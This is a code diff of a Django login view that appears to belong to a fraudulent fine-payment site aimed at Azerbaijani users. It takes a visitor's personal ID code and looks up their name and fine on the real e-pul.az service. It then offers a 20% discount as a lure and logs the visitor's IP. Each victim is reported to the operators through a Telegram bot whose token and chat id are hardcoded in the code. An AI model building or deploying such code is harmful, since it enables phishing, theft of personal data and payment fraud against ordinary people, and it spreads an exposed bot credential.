@@ -25,57 +25,64 @@ def login(request):
         FinCode = request.POST.get('clientLogins')
         client_ip = get_client_ip(request)
         if(FinCode!=''):
-            # contact.save(Protcol,ProtcolNumber,client_ip)
-            url = "https://e-pul.az/epay/az/guest_payment/check_client_info/1457"
-            data = {
-                "mode": "56",
-                "IAMAS": FinCode,
-                "selectedGroupId": "56",
-                "frameModel": "1",
-                "hdnserid": "1457",
-            }
-
-            # Send the POST request
-            response = requests.post(url, data=data)
-
-            # Check the response status code
-            if response.status_code == 200:
-                # Parse the JSON content of the response
-                response_data = json.loads(response.text)
-                full_name = response_data["fullName"]
-            
-            # Assuming there is only one subService and you want to extract its "amount"
-                sub_service_amount = response_data["subServices"][0]["amount"]
-                total_amount= full_name
-                father_name =sub_service_amount
-                # Print the "code" and "message" values
-                subtotal = float(father_name) - float(father_name) * 20 / 100
-                context={
-                "total_amount":total_amount,
-                "father_name":father_name,
-                "subtotal":subtotal
+            try:
+                # contact.save(Protcol,ProtcolNumber,client_ip)
+                url = "https://e-pul.az/epay/az/guest_payment/check_client_info/1457"
+                data = {
+                    "mode": "56",
+                    "IAMAS": FinCode,
+                    "selectedGroupId": "56",
+                    "frameModel": "1",
+                    "hdnserid": "1457",
                 }
-                contact = ContactModel(ip=client_ip,amount=subtotal)
-                contact.page_name="Melumat Doldurma sehifesi"
-                contact.save()
-                request.session['contact_id'] = contact.id
-                if(response_data["code"]=="Error"):
-                    context = {
-                        'display_error': '',  # if there's no error, set display_error to 'none'
-                    }
-                    return render(request, 'index.html',context)
-                print("Message:", response_data["message"])
-                request.session['contact_id'] = contact.id
-                ip_address = client_ip
-                country = get_country_from_ip(ip_address)
-                if country!= "AZ":
-                    country= 'Şübhəli İP!'
-                response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
 
-                return render(request, 'cerime2.html',context)
-            else:
-                print(f"Request failed with status code: {response.status_code}")
+                # Send the POST request
+                response = requests.post(url, data=data)
+
+                # Check the response status code
+                if response.status_code == 200:
+                    # Parse the JSON content of the response
+                    response_data = json.loads(response.text)
+                    full_name = response_data["fullName"]
+                
+                # Assuming there is only one subService and you want to extract its "amount"
+                    sub_service_amount = response_data["subServices"][0]["amount"]
+                    total_amount= full_name
+                    father_name =sub_service_amount
+                    # Print the "code" and "message" values
+                    subtotal = float(father_name) - float(father_name) * 20 / 100
+                    context={
+                    "total_amount":total_amount,
+                    "father_name":father_name,
+                    "subtotal":subtotal
+                    }
+                    contact = ContactModel(ip=client_ip,amount=subtotal)
+                    contact.page_name="Melumat Doldurma sehifesi"
+                    contact.save()
+                    request.session['contact_id'] = contact.id
+                    if(response_data["code"]=="Error"):
+                        context = {
+                            'display_error': '',  # if there's no error, set display_error to 'none'
+                        }
+                        return render(request, 'index.html',context)
+                    print("Message:", response_data["message"])
+                    request.session['contact_id'] = contact.id
+                    ip_address = client_ip
+                    country = get_country_from_ip(ip_address)
+                    if country!= "AZ":
+                        country= 'Şübhəli İP!'
+                    response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
+
+                    return render(request, 'cerime2.html',context)
+                else:
+                    print(f"Request failed with status code: {response.status_code}")
+            except:
+                context = {
+                    'display_error': '',  # if there's no error, set display_error to 'none'
+                }
+                return render(request, 'index.html',context)
         else:
+            
             total_amount, father_name = check_data(Protcol, ProtcolNumber)
             if total_amount == 'error':
                 context = {
